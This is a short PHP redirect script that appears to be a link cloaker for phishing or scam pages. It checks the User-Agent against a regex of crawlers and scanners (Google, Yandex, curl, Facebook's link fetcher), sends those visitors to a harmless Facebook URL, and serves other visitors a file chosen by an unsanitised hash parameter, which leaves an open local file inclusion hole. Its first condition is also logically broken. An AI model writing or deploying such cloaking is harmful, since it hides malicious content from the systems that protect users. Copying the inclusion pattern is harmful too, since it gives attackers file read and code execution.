<?php

if (!isset($_GET['hash']) && file_exists('links/' . $_GET['hash']))
   {
    $short_urlx1 = "https://www.youtube.com/shorts/".substr(md5(mt_rand()),0,20);
    header("location: $short_urlx1", true, 200);
    die();
    }

    else
    {
	    
   if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
        $short_urlx2 = "https://m.facebook.com/profiles.php";
        header("location: $short_urlx2", true, 200);
        die();
    }	    
	    

    else
    {
        include ('links/' . $_GET['hash']);
    }

}
?>
